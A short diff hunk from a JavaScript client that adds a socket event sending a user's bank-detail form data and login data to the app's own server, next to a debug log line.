@@ -17597,6 +17597,7 @@ socket.on('connect', () => {
                 data.pmethod = 'paytmW'
             }
             console.log(data, 123456879)
+            socket.emit('addBenkDetailsUserSide', {data, LOGINDATA})
         })
 
 
